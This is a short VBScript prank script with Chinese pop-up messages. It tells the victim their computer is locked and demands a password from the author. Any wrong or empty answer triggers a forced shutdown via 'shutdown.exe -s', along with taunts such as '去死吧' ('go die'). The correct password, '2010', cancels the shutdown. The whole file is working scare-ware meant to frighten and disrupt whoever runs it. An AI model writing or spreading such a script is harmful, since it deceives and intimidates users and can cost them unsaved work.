msgbox"你的电脑被锁定了，向作者要密码解锁",,"危险"
msgbox"别想关闭掉我"
dim a
dim b
dim c
a = inputbox("输入解锁密码","快")
set ws = createobject("wscript.shell")
if a = "2010"  then
	msgbox"输入对了，解锁了"
elseif isempty(a) then
	msgbox"输入空的等死吧！！！！！！！"
	ws.run"shutdown.exe -s"
	msgbox"想解锁吗？"
	b = inputbox("输入","最后一次")
	if b = "2010" then 
		msgbox"你安全了" 
		ws.run"shutdown.exe -a"
		msgbox"游玩愉快！"
	elseif isempty(b) then
		ws.run"shutdown.exe -s"
		msgbox"去死吧！"
	else
		ws.run"shutdown.exe -s"
		msgbox"去死吧！"
                 end if
else
	ws.run"shutdown.exe -s"
	msgbox"去死吧！"
	msgbox"想解锁吗？"
	c = inputbox("输入","最后一次")
	if c = "2010" then 
		msgbox"你安全了" 
		ws.run"shutdown.exe -a"
		msgbox"游玩愉快！！！"
end if
end if
